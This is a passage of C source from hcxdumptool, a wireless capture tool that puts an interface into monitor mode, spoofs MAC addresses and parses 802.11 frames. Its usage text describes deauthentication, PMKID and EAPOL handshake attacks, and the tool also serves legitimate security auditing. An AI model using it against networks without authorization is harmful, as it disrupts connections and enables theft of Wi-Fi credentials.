memset(&lastaddr2reassociationresponse, 0, 6);
lastsequencereassociationresponse = 0;

memset(&lastaddr1data, 0, 6);
memset(&lastaddr2data, 0, 6);
lastsequencedata = 0;
if(activescanflag == false)
	{
	send_broadcastbeacon();
	send_undirected_proberequest();
	}

printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"INTERFACE:...............: %s\n"
	"FILTERLIST...............: %d entries\n"
	"MAC CLIENT...............: %06x%06x\n"
	"MAC ACCESS POINT.........: %06x%06x (incremented on every new client)\n"
	"EAPOL TIMEOUT............: %d\n"
	"REPLAYCOUNT..............: %llu\n"
	"ANONCE...................: ",
	interfacename, filterlist_len, myouista, mynicsta, myouiap, mynicap, eapoltimeout, rcrandom);
	for(c = 0; c < 32; c++)
		{
		printf("%02x", anoncerandom[c]);
		}
printf("\n\n");
gettimeofday(&tv, NULL);
timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
timestampstart = timestamp;
set_channel();
channelchangedflag = false;
send_broadcastbeacon();
send_undirected_proberequest();

tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
while(1)
	{
	if(wantstopflag == true)
		{
		globalclose();
		}
	if(channelchangedflag == true)
		{
		cpa++;
		if(channelscanlist[cpa] == 0)
			{
			cpa = 0;
			}
		if(set_channel() == true)
			{
			if(activescanflag == false)
				{
				send_broadcastbeacon();
				send_undirected_proberequest();
				}
			}
		else
			{
			errorcount++;
			}
		channelchangedflag = false;
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	fdnum = select(fd_socket +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	else if(fdnum > 0 && FD_ISSET(fd_socket, &readfds))
		{
		memset(&ll, 0, sizeof(ll));
		fromlen = sizeof(ll);
		packet_len = recvfrom(fd_socket, &epb[EPB_SIZE], PCAPNG_MAXSNAPLEN, 0 ,(struct sockaddr*)&ll, &fromlen);
		if(packet_len == 0)
			{
			fprintf(stderr, "\ninterface went down\n");
			globalclose();
			}
		if(packet_len < 0)
			{
			perror("\nfailed to read packet");
			errorcount++;
			continue;
			}
		if(ll.sll_pkttype == PACKET_OUTGOING)
			{
			continue;
			}
		if(ioctl(fd_socket, SIOCGSTAMP , &tv) < 0)
			{
			errorcount++;
			continue;
			}
		timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
		incommingcount++;
		}
	else
		{
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		if((statusout) > 0)
			{
			printf("\33[2K\rINFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, powned=%llu, err=%d", channelscanlist[cpa], incommingcount, droppedcount, outgoingcount, pownedcount, errorcount);
			}
		if(errorcount >= maxerrorcount)
			{
			fprintf(stderr, "\nmaximum number of errors is reached\n");
			globalclose();
			}
		continue;
		}
	if(packet_len < (int)RTH_SIZE +(int)MAC_SIZE_ACK)
		{
		droppedcount++;
		continue;
		}
	packet_ptr = &epb[EPB_SIZE];
	rth = (rth_t*)packet_ptr;
	ieee82011_ptr = packet_ptr +le16toh(rth->it_len);
	ieee82011_len = packet_len -le16toh(rth->it_len);
	macfrx = (mac_t*)ieee82011_ptr;
	if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_LONG;
		payload_len = ieee82011_len -MAC_SIZE_LONG;
		}
	else
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_NORM;
		payload_len = ieee82011_len -MAC_SIZE_NORM;
		}

	if(macfrx->type == IEEE80211_FTYPE_MGMT)
		{
		if(memcmp(macfrx->addr2, &mac_broadcast, 6) == 0)
			{
			droppedcount++;
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_BEACON)
			{
			process80211beacon();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)
			{
			if((macfrx->sequence == lastsequenceproberequest) && (memcmp(macfrx->addr1, &lastaddr1proberequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2proberequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceproberequest = macfrx->sequence;
			memcpy(&lastaddr1proberequest, macfrx->addr1, 6);
			memcpy(&lastaddr2proberequest, macfrx->addr2, 6);
			if(memcmp(macfrx->addr1, &mac_broadcast, 6) == 0)
				{
				process80211probe_req();
				}
			else if(memcmp(macfrx->addr1, &mac_null, 6) == 0)
				{
				process80211probe_req();
				}
			else
				{
				process80211directed_probe_req();
				}
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP)
			{
			if((macfrx->sequence == lastsequenceproberesponse) && (memcmp(macfrx->addr1, &lastaddr1proberesponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2proberesponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceproberesponse = macfrx->sequence;
			memcpy(&lastaddr1proberesponse, macfrx->addr1, 6);
			memcpy(&lastaddr2proberesponse, macfrx->addr2, 6);
			process80211probe_resp();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_AUTH)
			{
			if((macfrx->sequence == lastsequenceauthentication) && (memcmp(macfrx->addr1, &lastaddr1authentication, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2authentication, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceauthentication = macfrx->sequence;
			memcpy(&lastaddr1authentication, macfrx->addr1, 6);
			memcpy(&lastaddr2authentication, macfrx->addr2, 6);
			process80211authentication();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ)
			{
			if((macfrx->sequence == lastsequenceassociationrequest) && (memcmp(macfrx->addr1, &lastaddr1associationrequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2associationrequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceassociationrequest = macfrx->sequence;
			memcpy(&lastaddr1associationrequest, macfrx->addr1, 6);
			memcpy(&lastaddr2associationrequest, macfrx->addr2, 6);
			process80211association_req();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP)
			{
			if((macfrx->sequence == lastsequenceassociationresponse) && (memcmp(macfrx->addr1, &lastaddr1associationresponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2associationresponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceassociationresponse = macfrx->sequence;
			memcpy(&lastaddr1associationresponse, macfrx->addr1, 6);
			memcpy(&lastaddr2associationresponse, macfrx->addr2, 6);
			process80211association_resp();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ)
			{
			if((macfrx->sequence == lastsequencereassociationrequest) && (memcmp(macfrx->addr1, &lastaddr1reassociationrequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2reassociationrequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequencereassociationrequest = macfrx->sequence;
			memcpy(&lastaddr1reassociationrequest, macfrx->addr1, 6);
			memcpy(&lastaddr2reassociationrequest, macfrx->addr2, 6);
			process80211reassociation_req();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP)
			{
			if((macfrx->sequence == lastsequencereassociationresponse) && (memcmp(macfrx->addr1, &lastaddr1reassociationresponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2reassociationresponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequencereassociationresponse = macfrx->sequence;
			memcpy(&lastaddr1reassociationresponse, macfrx->addr1, 6);
			memcpy(&lastaddr2reassociationresponse, macfrx->addr2, 6);
			process80211reassociation_resp();
			continue;
			}
		continue;
		}
	if(macfrx->type == IEEE80211_FTYPE_CTL)
		{
		continue;
		}
	if(macfrx->type == IEEE80211_FTYPE_DATA)
		{
		if((macfrx->sequence == lastsequencedata) && (memcmp(macfrx->addr1, &lastaddr1data, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2data, 6) == 0))
			{
			droppedcount++;
			continue;
			}
		lastsequencedata = macfrx->sequence;
		memcpy(&lastaddr1data, macfrx->addr1, 6);
		memcpy(&lastaddr2data, macfrx->addr2, 6);
		if((macfrx->subtype & IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
			{
			payload_ptr += QOS_SIZE;
			payload_len -= QOS_SIZE;
			}
		if( macfrx->subtype == IEEE80211_STYPE_NULLFUNC)
			{
			continue;
			}
		if(payload_len < (int)LLC_SIZE)
			{
			continue;
			}
		llc_ptr = payload_ptr;
		llc = (llc_t*)llc_ptr;
		if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			process80211eap();
			continue;
			}
		if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			if(fd_ippcapng != 0)
				{
				writeepb(fd_ippcapng);
				}
			continue;
			}
		if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			if(fd_ippcapng != 0)
				{
				writeepb(fd_ippcapng);
				}
			continue;
			}
		if(macfrx->protected ==1)
			{
			if(fd_weppcapng != 0)
				{
				mpdu_ptr = payload_ptr;
				mpdu = (mpdu_t*)mpdu_ptr;
				if(((mpdu->keyid >> 5) &1) == 0)
					{
					writeepb(fd_weppcapng);
					}
				}
			continue;
			}
		}
		continue;
	}
return;
}
/*===========================================================================*/
static inline void processrcascan()
{
struct sockaddr_ll ll;
socklen_t fromlen;
static rth_t *rth;
int fdnum;
fd_set readfds;
struct timeval tvfd;

gettimeofday(&tv, NULL);
timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
timestampstart = timestamp;
set_channel();
channelchangedflag = false;
send_broadcastbeacon();
send_undirected_proberequest();

tvfd.tv_sec = 1;
tvfd.tv_usec = 0;

while(1)
	{
	if(wantstopflag == true)
		{
		globalclose();
		}
	if(channelchangedflag == true)
		{
		cpa++;
		if(channelscanlist[cpa] == 0)
			{
			cpa = 0;
			}
		if(set_channel() == true)
			{
			if(activescanflag == false)
				{
				send_undirected_proberequest();
				}
			}
		else
			{
			errorcount++;
			}
		channelchangedflag = false;
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	fdnum = select(fd_socket +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	else if(fdnum > 0 && FD_ISSET(fd_socket, &readfds))
		{
		memset(&ll, 0, sizeof(ll));
		fromlen = sizeof(ll);
		packet_len = recvfrom(fd_socket, &epb[EPB_SIZE], PCAPNG_MAXSNAPLEN, 0 ,(struct sockaddr*) &ll, &fromlen);
		if(packet_len == 0)
			{
			fprintf(stderr, "\ninterface went down\n");
			globalclose();
			}
		if(packet_len < 0)
			{
			perror("\nfailed to read packet");
			errorcount++;
			continue;
			}
		if(ll.sll_pkttype == PACKET_OUTGOING)
			{
			continue;
			}
		if(ioctl(fd_socket, SIOCGSTAMP , &tv) < 0)
			{
			errorcount++;
			continue;
			}
		timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
		incommingcount++;
		}
	else
		{
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		if(errorcount >= maxerrorcount)
			{
			fprintf(stderr, "\nmaximum number of errors is reached\n");
			globalclose();
			}
		printapinfo();
		continue;
		}
	if(packet_len < (int)RTH_SIZE +(int)MAC_SIZE_ACK)
		{
		continue;
		}
	packet_ptr = &epb[EPB_SIZE];
	rth = (rth_t*)packet_ptr;
	ieee82011_ptr = packet_ptr +le16toh(rth->it_len);
	ieee82011_len = packet_len -le16toh(rth->it_len);
	macfrx = (mac_t*)ieee82011_ptr;
	if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_LONG;
		payload_len = ieee82011_len -MAC_SIZE_LONG;
		}
	else
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_NORM;
		payload_len = ieee82011_len -MAC_SIZE_NORM;
		}
	if(macfrx->type == IEEE80211_FTYPE_MGMT)
		{
		if(macfrx->subtype == IEEE80211_STYPE_BEACON)
			{
			process80211rcascanbeacon();
			}
		else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP)
			{
			process80211rcascanproberesponse();
			}
		 }
	if(fd_rcascanpcapng != 0)
		{
		writeepb(fd_rcascanpcapng);
		}
	}
return;
}
/*===========================================================================*/
static bool ischannelindefaultlist(int userchannel)
{
int cpd = 0;
while(channeldefaultlist[cpd] != 0)
	{
	if(userchannel == channeldefaultlist[cpd])
		{
		return true;
		}
	cpd++;
	}
return false;
}
/*===========================================================================*/
static inline bool processuserscanlist(char *optarglist)
{
static char *ptr;
static char *userscanlist;

userscanlist = strdupa(optarglist);
cpa = 0;
ptr = strtok(userscanlist, ",");
while(ptr != NULL)
	{
	channelscanlist[cpa] = atoi(ptr);
	if(ischannelindefaultlist(channelscanlist[cpa]) == false)
		{
		return false;
		}
	ptr = strtok(NULL, ",");
	cpa++;
	if(cpa > 127)
		{
		return false;
		}
	}
channelscanlist[cpa] = 0;
cpa = 0;

return true;
}
/*===========================================================================*/
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n')
		break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r')
		break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream))
	return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL)
	return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static inline int readfilterlist(char *listname, maclist_t *zeiger)
{
int len;
int c, entries;
static FILE *fh_filter;

static char linein[FILTERLIST_LINE_LEN];

if((fh_filter = fopen(listname, "r")) == NULL)
	{
	printf("opening blacklist failed %s\n", listname);
	return 0;
	}

zeiger = filterlist;
entries = 0;
c = 1;
while(entries < FILTERLIST_MAX)
	{
	if((len = fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1)
		{
		break;
		}
	if(len < 12)
		{
		c++;
		continue;
		}
	if(linein[0x0] == '#')
		{
		c++;
		continue;
		}
	if(hex2bin(&linein[0x0], zeiger->addr, 6) == true)
		{
		zeiger++;
		entries++;
		}
	else
		{
		printf("reading blacklist line %d failed: %s\n", c, linein);
		}
	c++;
	}
fclose(fh_filter);
return entries;
}
/*===========================================================================*/
static inline bool globalinit()
{
int c;
static int ret;
static pthread_t thread1;

#ifdef DOGPIOSUPPORT
static pthread_t thread2;
#endif

fd_pcapng = 0;
fd_ippcapng = 0;
fd_weppcapng = 0;
fd_rcascanpcapng = 0;

errorcount = 0;
incommingcount = 0;
droppedcount = 0;
outgoingcount = 0;

mydisassociationsequence = 0;
mydeauthenticationsequence = 0;
mybeaconsequence = 0;
myproberequestsequence = 0;
myauthenticationrequestsequence = 0;
myauthenticationresponsesequence = 0;
myassociationrequestsequence = 0;
myassociationresponsesequence = 0;
myproberesponsesequence = 0;
myidrequestsequence = 0;

mytime = 0;

#ifdef DOGPIOSUPPORT
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	return false;
	}
pinMode(0, OUTPUT);
pinMode(7, INPUT);
for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

srand(time(NULL));
setbuf(stdout, NULL);

myouiap = myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))];

mynicap = rand() & 0xffffff;
mac_mybcap[5] = mynicap & 0xff;
mac_mybcap[4] = (mynicap >> 8) & 0xff;
mac_mybcap[3] = (mynicap >> 16) & 0xff;
mac_mybcap[2] = myouiap & 0xff;
mac_mybcap[1] = (myouiap >> 8) & 0xff;
mac_mybcap[0] = (myouiap >> 16) & 0xff;
memcpy(&mac_myap, &mac_mybcap, 6);

myouista = myvendorsta[rand() %((MYVENDORSTA_SIZE /sizeof(int)))];
mynicsta = rand() & 0xffffff;
mac_mysta[5] = mynicsta &0xff;
mac_mysta[4] = (mynicsta >> 8) &0xff;
mac_mysta[3] = (mynicsta >> 16) &0xff;
mac_mysta[2] = myouista & 0xff;
mac_mysta[1] = (myouista >> 8) &0xff;
mac_mysta[0] = (myouista >> 16) &0xff;

memset(&laststam1, 0, 6);
memset(&lastapm1, 0, 6);
lastrcm1 = 0;
lasttimestampm1 = 0;
memset(&laststam2, 0, 6);
memset(&lastapm2, 0, 6);
lastrcm2 = 0;
lasttimestampm2 = 0;

rcrandom = (rand()%0xfff) +0xf000;
for(c = 0; c < 32; c++)
	{
	anoncerandom[c] = rand() %0xff;
	}

ret = pthread_create(&thread1, NULL, &channelswitchthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}

#ifdef DOGPIOSUPPORT
ret = pthread_create(&thread2, NULL, &rpiflashthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}
#endif

if((aplist = calloc((APLIST_MAX), APLIST_SIZE)) == NULL)
	{
	return false;
	}
aplist_ptr = aplist;
aplistcount = 0;


if((myaplist = calloc((MYAPLIST_MAX), MYAPLIST_SIZE)) == NULL)
	{
	return false;
	}
myaplist_ptr = myaplist;


if((pownedlist = calloc((POWNEDLIST_MAX), MACMACLIST_SIZE)) == NULL)
	{
	return false;
	}

filterlist_len = 0;
filterlist = NULL;
if(filterlistname != NULL)
	{
	if((filterlist = calloc((FILTERLIST_MAX), MACLIST_SIZE)) == NULL)
		{
		return false;
		}
	filterlist_len = readfilterlist(filterlistname, filterlist);
	if(filterlist_len == 0)
		{
		return false;
		}
	}

if(rcascanflag == true)
	{
	pcapngoutname = NULL;
	ippcapngoutname = NULL;
	weppcapngoutname = NULL;
	if(rcascanpcapngname != NULL)
		{
		fd_rcascanpcapng = hcxcreatepcapngdump(rcascanpcapngname, mac_orig, interfacename, rcrandom, anoncerandom);
		if(fd_rcascanpcapng <= 0)
			{
			fprintf(stderr, "could not create dumpfile %s\n", rcascanpcapngname);
			return false;
			}
		}
	}
if(pcapngoutname != NULL)
	{
	fd_pcapng = hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_pcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", pcapngoutname);
		return false;
		}
	}

if(weppcapngoutname != NULL)
	{
	fd_weppcapng = hcxcreatepcapngdump(weppcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_weppcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", weppcapngoutname);
		return false;
		}
	}

if(ippcapngoutname != NULL)
	{
	fd_ippcapng = hcxcreatepcapngdump(ippcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_ippcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", ippcapngoutname);
		return false;
		}
	}
wantstopflag = false;
signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
static inline bool opensocket()
{
static struct ifreq ifr;
static struct iwreq iwr;
static struct sockaddr_ll ll;

checkallunwanted();
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror( "socket failed (do you have root priviledges?)");
	return false;
	}

memset(&ifr_old, 0, sizeof(ifr));
strncpy(ifr_old.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr_old) < 0)
	{
	perror("failed to save current interface flags");
	close(fd_socket);
	return false;
	}

memset(&iwr_old, 0, sizeof(iwr));
strncpy(iwr_old.ifr_name, interfacename, IFNAMSIZ -1);
if (ioctl(fd_socket, SIOCGIWMODE, &iwr_old) < 0)
	{
	perror("failed to save current interface mode");
	close(fd_socket);
	return false;
	}

memset(&ifr, 0, sizeof(ifr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
	{
	perror("failed to set interface down");
	close(fd_socket);
	return false;
	}

memset(&iwr, 0, sizeof(iwr));
strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
iwr.u.mode = IW_MODE_MONITOR;
if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0)
	{
	perror("failed to set monitor mode");
	close(fd_socket);
	return false;
	}

ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
	{
	perror("failed to set interface up");
	close(fd_socket);
	return false;
	}

memset(&iwr, 0, sizeof(iwr));
strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
	{
	perror("failed to get interface informations");
	close(fd_socket);
	return false;
	}
if((iwr.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
	{
	fprintf(stderr, "interface is not in monitor mode\n");
	close(fd_socket);
	return false;
	}

memset(&iwr, 0, sizeof(iwr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
	{
	perror("failed to set interface down");
	close(fd_socket);
	return false;
	}
if((ifr.ifr_flags & (IFF_UP | IFF_BROADCAST | IFF_RUNNING)) != (IFF_UP | IFF_BROADCAST | IFF_RUNNING))
	{
	fprintf(stderr, "interface is not up\n");
	close(fd_socket);
	return false;
	}

memset(&ifr, 0, sizeof(ifr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("failed to get SIOCGIFINDEX");
	close(fd_socket);
	return false;
	}

memset(&ll, 0, sizeof(ll));
ll.sll_family = AF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
ll.sll_pkttype = PACKET_OTHERHOST|PACKET_BROADCAST|PACKET_MULTICAST|PACKET_HOST;
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("failed to bind socket");
	close(fd_socket);
	return false;
	}

if(ioctl(fd_socket, SIOCGIFHWADDR, &ifr) < 0)
	{
	perror("failed to get hardware address");
	close(fd_socket);
	return false;
	}
else
	{
	memset(&mac_orig, 0 ,6);
	memcpy(&mac_orig, ifr.ifr_hwaddr.sa_data, 6);
	}
return true;
}
/*===========================================================================*/
static bool check_wlaninterface(const char* ifname)
{
static int fd_info;
struct iwreq fpwrq;

memset(&fpwrq, 0, sizeof(fpwrq));
strncpy(fpwrq.ifr_name, ifname, IFNAMSIZ -1);
if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}

if(ioctl(fd_info, SIOCGIWNAME, &fpwrq) != -1)
	{
	return true;
	}
close(fd_info);
return false;
}
/*===========================================================================*/
static void show_wlaninterfaces()
{
struct ifaddrs *ifaddr = NULL;
struct ifaddrs *ifa = NULL;
struct sockaddr_ll *sfda;
static int i = 0;

if(getifaddrs(&ifaddr) == -1)
	{
	perror("failed to get ifaddrs");
	}
else
	{
	printf("wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			if(check_wlaninterface(ifa->ifa_name) == true)
				{
				sfda = (struct sockaddr_ll*)ifa->ifa_addr;
				for (i=0; i < sfda->sll_halen; i++)
					{
					printf("%02x", (sfda->sll_addr[i]));
					}
				printf(" %s (%d)\n", ifa->ifa_name, sfda->sll_ifindex);
				}
			}
		}
	freeifaddrs(ifaddr);
	}
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage  : %s <options>\n"
	"example: %s -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status=3\n"
	"         do not run hcxdumptool on logical interfaces (monx, wlanxmon)\n"
	"         do not use hcxdumptool in combination with other 3rd party tools, which take access to the interface\n"
	"\n"
	"options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxdumptool)\n"
	"                 can also be done manually:\n"
	"                 ip link set <interface> down\n"
	"                 iw dev <interface> set type monitor\n"
	"                 ip link set <interface> up\n"
	"-o <dump file> : output file in pcapngformat\n"
	"                 management frames and EAP/EAPOL frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-O <dump file> : output file in pcapngformat\n"
	"                 unencrypted IPv4 and IPv6 frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-W <dump file> : output file in pcapngformat\n"
	"                 encrypted WEP frames\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-c <digit>     : set scanlist  (1,2,3,...)\n"
	"                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12\n"
	"                 maximum entries: 127\n"
	"                 allowed channels:\n"
	"                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n"
	"                 34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64\n"
	"                 100, 104, 108, 112, 116, 120, 124, 128, 132,\n"
	"                 136, 140, 144, 147, 149, 151, 153, 155, 157\n"
	"                 161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default: %d seconds\n"
	"-E <digit>     : EAPOL timeout\n"
	"                 default: %d = 1 second\n"
	"                 value depends on channel assignment\n"
	"-D <digit>     : deauthentication interval\n"
	"                 default: %d (every %d beacons)\n"
	"                 the target beacon interval is used as trigger\n"
	"-A <digit>     : ap attack interval\n"
	"                 default: %d (every %d beacons)\n"
	"                 the target beacon interval is used as trigger\n"
	"-I             : show wlan interfaces and quit\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"--filterlist=<file>                : mac filter list\n"
	"                                     format: 112233445566 + comment\n"
	"                                     maximum line lenght %d, maximum entries %d\n"
	"--filtermode=<digit>               : mode for filter list\n"
	"                                     1: use filter list as protection list (default)\n"
	"                                     2: use filter list as target list\n"
	"--disable_active_scan              : do not transmit proberequests to BROADCAST using a BROADCAST ESSID\n"
	"                                     do not transmit BROADCAST beacons\n"
	"                                     affected: ap-less and client-less attacks\n"
	"--disable_deauthentications        : disable transmitting deauthentications\n"
	"                                     affected: connections between client an access point\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries\n"
	"                                     default: %d tries (minimum: 4)\n"
	"                                     affected: connections between client an access point\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--disable_disassociations          : disable transmitting disassociations\n"
	"                                     affected: retry (EAPOL 4/4 - M4) attack\n"
	"--disable_ap_attacks               : disable attacks on single access points\n"
	"                                     affected: client-less (PMKID) attack\n"
	"--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries\n"
	"                                     default: %d tries (minimum: 4)\n"
	"                                     affected: client-less attack\n"
	"                                     deauthentication attacks will not work against protected management frames\n"
	"--disable_client_attacks           : disable attacks on single clients\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"--do_rcascan                       : show radio channel assignment (scan for target access points)\n"
	"--station_vendor=<digit>           : use this VENDOR information for station\n"
	"                                     0: transmit no VENDOR information (default)\n"
	"                                     1: Broadcom\n"
	"                                     2: Apple-Broadcom\n"
	"                                     3: Sonos\n"
	"                                     4: Netgear-Broadcom\n"
	"                                     5: Wilibox Deliberant Group LLC\n"
	"                                     6: Cisco Systems, Inc\n"
	"                                     you should disable auto scrolling in your terminal settings\n"
	"--save_rcascan=<file>              : output rca scan list to file when hcxdumptool terminated\n"
	"--save_rcascan_raw=<file>          : output file in pcapngformat\n"
	"                                     unfiltered packets\n"
	"                                     including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"--enable_status=<digit>            : enable status messages\n"
	"                                     bitmask:\n"
	"                                      1: EAPOL\n"
	"                                      2: PROBEREQUEST/PROBERESPONSE\n"
	"                                      4: AUTHENTICATON\n"
	"                                      8: ASSOCIATION\n"
	"                                     16: BEACON\n"
	"--help                             : show this help\n"
	"--version                          : show version\n"
	"\n",
	eigenname, VERSION, VERSION_JAHR, eigenname, eigenname, TIME_INTERVAL, EAPOLTIMEOUT, DEAUTHENTICATIONINTERVALL,
	DEAUTHENTICATIONINTERVALL, APATTACKSINTERVALL, APATTACKSINTERVALL, FILTERLIST_LINE_LEN, FILTERLIST_MAX,
	DEAUTHENTICATIONS_MAX, APPATTACKS_MAX);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static bool showinterfaces = false;
maxerrorcount = ERRORMAX;
staytime = TIME_INTERVAL;
eapoltimeout = EAPOLTIMEOUT;
